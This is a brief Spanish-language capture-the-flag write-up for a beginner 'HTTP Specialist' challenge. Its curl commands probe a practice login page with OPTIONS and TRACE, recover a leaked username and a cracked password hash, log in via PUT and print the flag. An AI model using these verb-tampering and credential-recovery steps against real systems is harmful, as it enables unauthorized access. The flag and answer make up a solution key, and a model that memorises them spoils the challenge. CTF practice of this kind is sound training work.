# Begginer / HTTP Specialist

Buscamos los metodos disponibles para el login

`curl -X 'OPTIONS' https://http-verbs.ctf.cert.unlp.edu.ar/login`

Probamos con TRACE

`curl -X TRACE https://http-verbs.ctf.cert.unlp.edu.ar/login`

Devuelve un texto en base64 y un hash
+ El texto decodificado es el usuario: hugo
+ El hash crackeado es la contraseña: password123

No devuelve nada con un metodo POST, asi que probamos con PUT y obtenemos la flag

`curl -X PUT -d "username=hugo&password=password123" https://http-verbs.ctf.cert.unlp.edu.ar/login`

`flag{TR4C3_Th3_HttP_V3rbs}`
